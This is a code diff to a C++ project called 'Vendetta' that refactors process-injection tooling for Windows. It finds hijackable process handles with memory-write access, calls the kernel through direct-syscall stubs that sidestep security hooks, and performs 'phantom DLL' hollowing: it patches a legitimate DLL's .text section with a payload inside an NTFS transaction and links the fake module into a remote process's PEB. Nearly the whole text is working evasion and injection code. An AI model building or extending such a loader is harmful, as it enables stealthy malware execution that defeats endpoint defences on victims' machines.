@@ -1,11 +1,13 @@
 #include "vendetta/vendetta.h"
-#include "vendetta/debug_logger.h"
+#include "vendetta/logger.h"
 
 #include <ntpsapi.h>
 #include <ntldr.h>
 #include <ntioapi.h>
 #include <phnt_ntdef.h>
 #include <ntmmapi.h>
+
+#include <utility>
 
 namespace Vendetta
 {
@@ -60,7 +62,7 @@ namespace Vendetta
         return buffer;
     }
 
-    PVOID GetProcessObject(const DWORD targetPid)
+    PVOID GetProcessObjectTypeFromTarget(const DWORD targetPid)
     {
         const HANDLE hLocalHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, targetPid);
         if (!hLocalHandle)
@@ -91,12 +93,59 @@ namespace Vendetta
             CloseHandle(hLocalHandle);
             return nullptr;
         }
+		CloseHandle(hLocalHandle);
         return targetObjectAddress;
+    }
+    BYTE GetProcessObjectTypeIndex()
+    {
+        HANDLE hSelf = GetCurrentProcess();
+        HANDLE hRealSelf = nullptr;
+
+        Sw3NtDuplicateObject(GetCurrentProcess(), hSelf,
+            GetCurrentProcess(), &hRealSelf, 0, 0,
+            DUPLICATE_SAME_ACCESS);
+
+        ULONG size = 0x10000;
+        PSYSTEM_HANDLE_INFORMATION_EX info;
+        NTSTATUS status;
+        BYTE typeIndex = 0;
+
+        do
+        {
+            info = static_cast<PSYSTEM_HANDLE_INFORMATION_EX>(VirtualAlloc(
+                nullptr, size, MEM_COMMIT, PAGE_READWRITE));
+            status = Sw3NtQuerySystemInformation(
+                SystemExtendedHandleInformation, info, size, &size);
+            if (std::cmp_equal(status, STATUS_INFO_LENGTH_MISMATCH))
+            {
+                VirtualFree(info, 0, MEM_RELEASE);
+                size *= 2;
+            }
+        } while (status == STATUS_INFO_LENGTH_MISMATCH);
+
+        if (NT_SUCCESS(status) && info)
+        {
+            DWORD myPID = GetCurrentProcessId();
+            for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++)
+            {
+                if (info->Handles[i].UniqueProcessId == UlongToHandle(myPID)
+                    &&
+                    info->Handles[i].HandleValue == hRealSelf)
+                {
+                    typeIndex = static_cast<BYTE>(info->Handles[i].
+                        ObjectTypeIndex);
+                    break;
+                }
+            }
+        }
+
+        if (info) VirtualFree(info, 0, MEM_RELEASE);
+        Sw3NtClose(hRealSelf);
+        return typeIndex;
     }
 
 	HANDLE FindProcessHandleInternal(const DWORD& targetPid)
 	{
-        PVOID processTypeIndex = GetProcessObject(targetPid);
 		auto systemInfoBuffer = GetSystemInfoClass(SystemExtendedHandleInformation);
 		const auto handleInfo = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION_EX>(systemInfoBuffer.data());
 
@@ -108,7 +157,8 @@ namespace Vendetta
 
             if (entry.UniqueProcessId != UlongToHandle(myPid)) continue;
 
-			if (entry.Object != processTypeIndex) continue;
+            if (entry.ObjectTypeIndex != GetProcessObjectTypeIndex())
+                continue;
 
             const ACCESS_MASK needed = PROCESS_VM_WRITE | PROCESS_VM_OPERATION;
             if ((entry.GrantedAccess & needed) != needed) continue;
@@ -380,10 +430,10 @@ namespace Vendetta
             return false;
         }
 
-        DWORD fileSize = GetFileSize(hFile, nullptr);
-        std::vector<BYTE> pe_buffer(fileSize);
+        const DWORD fileSize = GetFileSize(hFile, nullptr);
+        std::vector<BYTE> peBuffer(fileSize);
         DWORD bytesRead = 0;
-        if (!ReadFile(hFile, pe_buffer.data(), fileSize, &bytesRead, nullptr))
+        if (!ReadFile(hFile, peBuffer.data(), fileSize, &bytesRead, nullptr))
         {
             Log(LogError, "ReadFile failed.");
             CloseHandle(hFile);
@@ -391,16 +441,16 @@ namespace Vendetta
         }
         CloseHandle(hFile);
 
-        auto pDos = reinterpret_cast<PIMAGE_DOS_HEADER>(pe_buffer.data());
+        const auto pDos = reinterpret_cast<PIMAGE_DOS_HEADER>(peBuffer.data());
         if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return false;
 
-        auto pNt = reinterpret_cast<PIMAGE_NT_HEADERS>(pe_buffer.data() + pDos->e_lfanew);
+        auto pNt = reinterpret_cast<PIMAGE_NT_HEADERS>(peBuffer.data() + pDos->e_lfanew);
         if (pNt->Signature != IMAGE_NT_SIGNATURE) return false;
 
         auto pSection = IMAGE_FIRST_SECTION(pNt);
         PIMAGE_SECTION_HEADER pTextSection = nullptr;
 
-        for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++)
+        for (int i = 0; std::cmp_less(i, pNt->FileHeader.NumberOfSections); i++)
         {
             if (strncmp(reinterpret_cast<char*>(pSection[i].Name), ".text", 5) == 0)
             {
@@ -422,9 +472,9 @@ namespace Vendetta
         }
 
         HANDLE hTransaction;
-        OBJECT_ATTRIBUTES obj_attr = { sizeof(OBJECT_ATTRIBUTES) };
+        OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
 
-        NTSTATUS status = Sw3NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &obj_attr, nullptr, nullptr, 0, 0, 0, nullptr, nullptr);
+        NTSTATUS status = Sw3NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &objAttr, nullptr, nullptr, 0, 0, 0, nullptr, nullptr);
         if (!NT_SUCCESS(status))
         {
             Log(LogError, "Sw3NtCreateTransaction failed: {:x}", status);
@@ -432,7 +482,7 @@ namespace Vendetta
         }
         Log(LogInfo, "Transaction created.");
 
-        HANDLE hTransactedFile = CreateFileTransactedW(legitimateDllPath.c_str(), GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr, hTransaction, nullptr, nullptr);
+        const HANDLE hTransactedFile = CreateFileTransactedW(legitimateDllPath.c_str(), GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr, hTransaction, nullptr, nullptr);
         if (hTransactedFile == INVALID_HANDLE_VALUE)
         {
             Log(LogError, "CreateFileTransactedW failed: {}", GetLastError());
@@ -441,14 +491,14 @@ namespace Vendetta
         }
 
         Log(LogInfo, "Patching .text section in memory...");
-        memcpy(pe_buffer.data() + pTextSection->PointerToRawData, buf, bufSize);
+        memcpy(peBuffer.data() + pTextSection->PointerToRawData, buf, bufSize);
 
         Log(LogInfo, "Writing patched PE content to transaction...");
 
         IO_STATUS_BLOCK io_status;
         LARGE_INTEGER byteOffset = {};
 
-        status = Sw3NtWriteFile(hTransactedFile, nullptr, nullptr, nullptr, &io_status, pe_buffer.data(), static_cast<ULONG>(pe_buffer.size()), &byteOffset, nullptr);
+        status = Sw3NtWriteFile(hTransactedFile, nullptr, nullptr, nullptr, &io_status, peBuffer.data(), static_cast<ULONG>(peBuffer.size()), &byteOffset, nullptr);
         if (!NT_SUCCESS(status))
         {
             Log(LogError, "Sw3NtWriteFile failed: {:x}", status);
@@ -498,7 +548,7 @@ namespace Vendetta
 
         Log(LogInfo, "Linking phantom dll to PEB...");
 
-        auto pNtRemote = reinterpret_cast<PIMAGE_NT_HEADERS>(pe_buffer.data() + pDos->e_lfanew);
+        auto pNtRemote = reinterpret_cast<PIMAGE_NT_HEADERS>(peBuffer.data() + pDos->e_lfanew);
         ULONG image_size = pNtRemote->OptionalHeader.SizeOfImage;
 
         if (!LinkModuleToPeb(pi, remoteBase, executionAddress, image_size, legitimateDllPath))
